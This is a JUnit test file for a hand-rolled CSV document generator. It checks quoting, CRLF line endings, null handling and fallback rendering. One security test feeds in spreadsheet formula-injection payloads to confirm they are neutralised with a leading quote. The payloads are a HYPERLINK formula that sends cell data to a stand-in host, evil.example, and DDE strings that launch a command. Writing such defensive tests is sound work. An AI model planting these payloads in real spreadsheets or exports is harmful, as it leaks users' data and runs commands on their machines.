package com.agenticai.core.documentgen.generator.impl;

import static org.junit.jupiter.api.Assertions.assertEquals;

import com.agenticai.core.documentgen.model.DocumentContent;
import com.agenticai.core.documentgen.model.DocumentGenerationRequest;
import com.agenticai.core.documentgen.model.DocumentType;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;
import org.junit.jupiter.api.Test;

/**
 * {@link CsvDocumentGenerator} hand-rolls RFC-4180-style quoting instead of
 * pulling in a CSV library, so the quoting rules ARE the implementation -
 * a regression here produces files that Excel/Sheets silently mis-parse
 * (shifted columns, swallowed quotes), which no compile step would catch.
 * Assertions are exact byte-for-byte strings including the CRLF line
 * separator, because the separator choice is part of the format contract.
 */
class CsvDocumentGeneratorTest {

    private final CsvDocumentGenerator generator = new CsvDocumentGenerator();

    @Test
    void supportsCsv() {
        assertEquals(DocumentType.CSV, generator.supportedType());
    }

    @Test
    void tableRendersHeaderRowThenDataRows() throws Exception {
        DocumentContent content = new DocumentContent(null, List.of(),
            new DocumentContent.Table(List.of("name", "city"), List.of(
                List.of("Asha", "Pune"),
                List.of("Ravi", "Chennai")
            )), null, null);

        assertEquals("name,city\r\nAsha,Pune\r\nRavi,Chennai\r\n", generate(content));
    }

    @Test
    void fieldsWithCommaQuoteOrNewlineAreQuotedAndInnerQuotesDoubled() throws Exception {
        DocumentContent content = new DocumentContent(null, List.of(),
            new DocumentContent.Table(List.of("value"), List.of(
                List.of("a,b"),
                List.of("say \"hi\""),
                List.of("line1\nline2"),
                List.of("plain")
            )), null, null);

        assertEquals(
            "value\r\n\"a,b\"\r\n\"say \"\"hi\"\"\"\r\n\"line1\nline2\"\r\nplain\r\n",
            generate(content));
    }

    @Test
    void sec046FormulaCellsAreNeutralisedWithALeadingQuote() throws Exception {
        DocumentContent content = new DocumentContent(null, List.of(),
            new DocumentContent.Table(List.of("value"), List.of(
                List.of("=HYPERLINK(\"http://evil.example/?\"&A1,\"Click\")"),
                List.of("+cmd|' /C calc'!A0"),
                List.of("-2+3+cmd|' /C calc'!A0"),
                List.of("@SUM(1+1)*cmd|' /C calc'!A0"),
                List.of("\t=1+1"),
                List.of("-42.5"),
                List.of("safe=1")
            )), null, null);

        assertEquals(
            "value\r\n"
                + "\"'=HYPERLINK(\"\"http://evil.example/?\"\"&A1,\"\"Click\"\")\"\r\n"
                + "'+cmd|' /C calc'!A0\r\n"
                + "'-2+3+cmd|' /C calc'!A0\r\n"
                + "'@SUM(1+1)*cmd|' /C calc'!A0\r\n"
                + "'\t=1+1\r\n"
                + "-42.5\r\n"
                + "safe=1\r\n",
            generate(content));
    }

    @Test
    void nullCellsRenderAsEmptyNotTheStringNull() throws Exception {
        DocumentContent content = new DocumentContent(null, List.of(),
            new DocumentContent.Table(List.of("a", "b"), List.of(
                Arrays.asList(null, "x")
            )), null, null);

        assertEquals("a,b\r\n,x\r\n", generate(content));
    }

    @Test
    void withoutATableSectionsFlattenToOneColumnInOrder() throws Exception {
        DocumentContent content = new DocumentContent("ignored title", List.of(
            new DocumentContent.Section("Heading", List.of("para one"), List.of("bullet one"))
        ), null, null, null);

        assertEquals("Heading\r\npara one\r\nbullet one\r\n", generate(content));
    }

    @Test
    void withoutTableOrSectionsRawTextSplitsToOneRowPerLine() throws Exception {
        DocumentContent content = new DocumentContent(null, List.of(), null, "first\nsecond", null);

        assertEquals("first\r\nsecond\r\n", generate(content));
    }

    @Test
    void emptyContentProducesAnEmptyFileNotAnException() throws Exception {
        DocumentContent content = new DocumentContent(null, List.of(), null, null, null);

        assertEquals("", generate(content));
    }

    private String generate(DocumentContent content) throws Exception {
        byte[] bytes = generator.generate(new DocumentGenerationRequest(DocumentType.CSV, "test", content));
        return new String(bytes, StandardCharsets.UTF_8);
    }
}
